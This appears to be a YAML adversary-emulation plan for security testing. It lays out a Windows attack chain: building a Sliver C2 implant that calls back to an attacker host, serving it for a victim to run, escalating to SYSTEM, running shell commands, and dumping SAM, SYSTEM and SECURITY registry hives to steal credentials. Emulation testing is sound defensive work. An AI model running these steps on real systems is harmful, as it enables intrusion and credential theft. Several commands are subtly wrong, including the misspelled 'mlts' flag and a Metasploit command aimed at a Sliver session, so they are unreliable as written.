emulation_plan_details:
  adversary_name: test
  creation_time: 2025-04-08 00:12:34 UTC+0000
attack_action_sequence:
  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
    name: Build Sliver implant
    id: T1071.001
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique: Application Layer Protocol - Web Protocols
    description: |
      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
    execution:
      executor: Sliver Console
      command: |
        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mlts --lport #{LPORT}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the generated payload
        type:
  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
    name: Simulate the victim download and execute malicious payload file
    id: T1204.002
    source: Manual
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique: |
      User Execution: Malicious File
    description:
    execution:
      executor: Human
      command: |
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH}
    arguments:
      LHOST:
        default:
        description: IP address of the attacker machine
        type:
      LPORT:
        default:
        description: listening port of the attacter machine
        type:
      SAVE_PATH:
        default:
        description: Saved path of the downloaded payload
        type:
  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
    name: Execute a Sliver Implant Payload
    id: T1071.001
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Command and Control
    technique: Application Layer Protocol - Web Protocols
    description: |
      Executing a Sliver implant payload will establish a Sliver session.
    execution:
      executor: None
      command: |
        None
    arguments:
  - uuid: 5a1d2b9f-4e7f-8a4d-3f7a-6c2e5e9f9f7c
    name: Privilege Escalation
    id:
      - T1134
    source: Metasploit
    supported_platforms:
      - windows
    tactics:
      - Privilege Escalation
    technique: |
      Access Token Manipulation
    description: The `get_system` command attempts to gain SYSTEM-level privileges.
    execution:
      executor: Meterpreter Executor
      command: get_system (#{hosting_process},#{config},#{SessionID})
    arguments:
      hosting_process:
        description: Target process ID or name for privilege escalation
      config:
        description: Configuration options for escalation method
        default: Service
      SessionID:
        description: The session ID of the active Sliver connection.
  - uuid: 2074d817-7819-401b-b552-1045672f77f3
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Executor
      command: cmd(#{SessionID})
    arguments:
      SessionID:
        description: The session ID of the active Sliver connection.
  - uuid: 5c2571d0-1572-416d-9676-812e64ca9f44
    name: Registry dump of SAM, creds, and secrets
    id:
      - T1003.002
    source: ART
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: Security Account Manager'
    description: |
      Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
      via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

      Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
    execution:
      executor: Elevated Command Prompt Executor
      command: |
        reg save HKLM\sam %temp%\sam
        reg save HKLM\system %temp%\system
        reg save HKLM\security %temp%\security
    arguments:
    dependencies:
testbed_requirement:
  OS: []
  CVE: []
